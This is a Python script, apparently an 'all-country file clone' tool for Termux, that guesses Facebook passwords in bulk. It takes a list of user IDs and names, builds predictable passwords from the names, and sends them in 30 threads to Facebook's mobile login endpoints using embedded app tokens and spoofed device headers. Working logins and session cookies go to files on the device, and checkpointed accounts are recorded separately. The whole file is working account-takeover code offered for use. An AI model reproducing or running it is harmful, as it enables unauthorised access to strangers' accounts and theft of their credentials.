#--------------------< IMPORT >--------------------#
import requests,random,uuid,string,hashlib,json,os,base64,zlib,pip,urllib,urllib3,platform,math,smtplib,os,base64,zlib,pip,urllib
from os import path
from urllib.request import urlopen
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
	print('<[=]> INSTALLING MISSING MODULES...');os.system('pip install requests futures==2 > /dev/null')
except:pass
#--------------------< LOOP >--------------------#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];user=[];plist=[]
#--------------------< SYS >--------------------#
sys.stdout.write('\x1b]2; <[POCO-XD]>\x07')
#--------------------< COLOUR >--------------------#
G="\x1b[38;5;46m";W="\x1b[38;5;15m";R="\x1b[38;5;160m";B="\033[1;90m";Y="\033[1;33m";T="\033[1;34m";P="\x1b[38;5;205m"
#--------------------< STYLE >--------------------#
xd=f"{R}<{W}={R}>{G}";xd1=f"{R}<{W}1{R}>{G}";xd2=f"{R}<{W}2{R}>{G}";xd3=f"{R}<{W}3{R}>{G}";xd4=f"{R}<{W}4{R}>{G}";xd5=f"{R}<{W}5{R}>{G}";xd6=f"{R}<{W}6{R}>{G}";xd0=f"{R}<{W}0{R}>{G}";xdx=f"{R}<{W}?{R}>{G}";xdxx=f"{R}:{G}"
#--------------------< CLEAR >--------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{W}──────────────────────────────────────────────────')
#--------------------< LOGO >--------------------#
logo = f"""
      {G}  _____   _____  _______  _____ 
      {W} |_____] |     | |       |     |
      {G} |       |_____| |_____  |_____| {W}1.0
{W}──────────────────────────────────────────────────
{xd} OWNER    {xdxx} MR-POCO
{xd} TOOLTYPE {xdxx} FILE{R}[{W}ALL-COUNTRY{R}]{G}CLONE
{xd} STATUS   {xdxx} SCRIPT GIFT
{W}──────────────────────────────────────────────────"""
#--------------------< MAIN MENU >--------------------#
def poco():
    clear();print(f"{xd1} START FILE CLONE ");print(f"{xd0} EXIT CLONING");linex();sadiya=input(f"{xdx} SELECT {xdxx} ")
    if sadiya in ['1']:___file___()
    elif sadiya in ['2']:___random___()
    elif sadiya in ['0']:exit()
    else:linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN");time.sleep(1);poco()
#--------------------< FILE MENU >--------------------#
def ___file___():
	clear();print(f'{xd} EXAMPLE {xdxx} /sdcard/poco.txt');linex();file=input(f"{xdx} ENTER FILE NAME {xdxx} ")
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN");time.sleep(1);___file___()
	clear();print(f'{xd1} METHOD {R}|{G}M1{R}|');print(f'{xd2} METHOD {R}|{G}M2{R}|');linex();methd=input(f"{xdx} SELECT {xdxx} ")
	clear();print(f'{xd} NOTE {xdxx} AUTO PASSWORD ONLY BD WORKING ');linex();print(f'{xd1} AUTO {R}|{G}23{R}|{G} PASSWORD CLONE');print(f'{xd2} MANUAL PASSWORD CLONE');linex();ppp=input(f"{xdx} SELECT {xdxx} ")
	if ppp in ['1']:
		plist.append('firstlast')
		plist.append('first last')
		plist.append('first12')
		plist.append('first123')
		plist.append('first1234')
		plist.append('first12345')
		plist.append('first@')
		plist.append('first@@')
		plist.append('first@@@')
		plist.append('first@@@@')
		plist.append('first@#')
		plist.append('first@@##')
		plist.append('first@123')
		plist.append('first##')
		plist.append('first1122')
		plist.append('first111')
		plist.append('@first@')
		plist.append('@@first@@')
		plist.append('First123')
		plist.append('last123')
		plist.append('first###')
		plist.append('@@@###')
		plist.append('free fire')
	else:
		try:
			clear();print(f'{xd} EXAMPLE {xdxx} PASSWORD LIMIT {R}|{G}10-25{R}|');linex()
			ps_limit = int(input(f'{xdx} ENTER PASSWORD LIMIT {xdxx} '))
		except:
			ps_limit = 5
		clear();print(f'{xd} EXAMPLE {xdxx} first12 {R}|{G} first123 {R}|{G} firstlast ');linex()
		for i in range(ps_limit):
			plist.append(input(f'{xd} PASSWORD NO{R}|{G}{i+1}{R}| {xdxx} '))
	clear();print(f'{xd} CP UID SHOW {xdxx} {R}|{G}y{R}|{G}n{R}|');linex();cpx=input(f"{xdx} SELECT {xdxx} ")
	if cpx in ['y','Y','yes','Yes','1']:
		pcp.append('y')
	else:
		pcp.append('n')
	with tred(max_workers=30) as __poco__:
		clear();total_ids = str(len(fo))
		print(f'{xd} UID{R}|{G}METHOD {xdxx}{W} {total_ids}{R}|{W}M{methd} ');print(f"{xd} IF NO RESULT {R}|{G}ON{R}|{G}OFF{R}|{G} AIRPLANE MODE");linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methd in ['1']:
				__poco__.submit(___M1___,ids,names,passlist)
			elif methd in ['2']:
				__poco__.submit(___M2___,ids,names,passlist)
			else:
				__poco__.submit(___M1___,ids,names,passlist)
	print('\033[1;37m');linex();print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK{R}|{G}CP {xdxx} '+str(len(oks))+'/'+str(len(cps)));linex();exit()
#--------------------< FILE METHOD M1 >--------------------#
def ___M1___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r{R}<{W}={R}>{W}-{R}<{G}MR-POCO{R}>{W}-{R}|{T}%s{R}|{W}-{R}|{G}%s{R}|{W}-{R}|{P}%s{R}| '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        with requests.Session() as session:
                        	M1 = "[FBAN/FB4A;FBAV/405.0.0.23.72;FBBV/440002512;FBDM/{density=3.0,width=720,height=2176};FBLC/en_Qaag_US;FBRV/359080319;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1907_19;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        	data = {"adid": str(uuid.uuid4()),
                        	"format": "json","device_id": str(uuid.uuid4()),
                        	"cpl": "true","family_device_id":str(uuid.uuid4()),
                        	"credentials_type": "device_based_login_password",
                        	"error_detail_type": "button_with_disabled",
                        	"source": "device_based_login",
                        	"email": ids,"password": pas,
                        	"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                        	"generate_session_cookies": "1",
                        	"meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),
                        	"currently_logged_in_userid": "0","locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                        	"client_country_code": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]), 
                        	"method": "auth.login","fb_api_req_friendly_name": "authenticate",
                        	"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        	"api_key": "882a8490361da98702bf97a021ddc14d"}
                        	headers = {'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{M1}',
                        	"Accept-Encoding": "gzip, deflate",
                        	"Accept": "*/*","Connection": "keep-alive",
                        	"Content-Type": "application/x-www-form-urlencoded",
                        	"Host": "graph.facebook.com",
                        	"X-FB-Net-HNI": str(random.randint(3e7,4e7)),
                        	"X-FB-SIM-HNI": str(random.randint(2e4,4e4)),
                        	"X-FB-Connection-Type": "MOBILE.LTE",
                        	"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                        	"x-fb-device-group": str(random.randint(3e7,4e7)),
                        	"X-FB-Friendly-Name": "ViewerReactionsMutation",
                        	"X-FB-Request-Analytics-Tags": "graphservice",
                        	"X-FB-HTTP-Engine": "Liger",
                        	"X-FB-Client-IP": "True","X-FB-Server-Cluster": "True",
                        	"x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
                        url = "https://api.face"+"book.com/au"+"th/lo"+"gin"
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        cookie = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}POCO-OK{R}>{G} '+ids+' | '+pas+'\033[1;97m')
                                        #print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}COOKIES{R}>{G} '+cookie);linex()
                                        open('/sdcard/POCO-FILE-M1-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R}<{W}={R}>{W}-{R}<{P}POCO-CP{R}>{P} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/POCO-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#--------------------< FILE METHOD M2 >--------------------#
def ___M2___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r{R}<{W}={R}>{W}-{R}<{G}MR-POCO{R}>{W}-{R}|{T}%s{R}|{W}-{R}|{G}%s{R}|{W}-{R}|{P}%s{R}| '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        M2 = "[FBAN/FB4A;FBAV/405.0.0.23.72;FBBV/440002512;FBDM/{density=3.0,width=720,height=2176};FBLC/en_Qaag_US;FBRV/359080319;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1907_19;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        data = {"adid": adid,"format": "json",
                        "device_id": str(uuid.uuid4()),
                        "email": ids,"password": pas,
                        "generate_analytics_claims": "1",
                        "credentials_type": "password",
                        "source": "login","error_detail_type": "button_with_disabled",
                        "enroll_misauth": "false",
                        "generate_session_cookies": "1",
                        "generate_machine_id": "1",
                        "fb_api_req_friendly_name": "authenticate",}
                        headers={"Accept-Encoding": "gzip, deflate",
                        "Accept": "*/*","Connection": "keep-alive",
                        "User-Agent": '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{M2}',
                        "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                        "X-FB-Friendly-Name": "authenticate",
                        "X-FB-Connection-Type": "unknown",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "X-FB-HTTP-Engine": "Liger","Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        cookie = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}POCO-OK{R}>{G} '+ids+' | '+pas+'\033[1;97m')
                                        #print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}COOKIES{R}>{G} '+cookie);linex()
                                        open('/sdcard/POCO-FILE-M2-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R}<{W}={R}>{W}-{R}<{P}POCO-CP{R}>{P} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/POCO-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#--------------------< END CODE >--------------------#
poco()
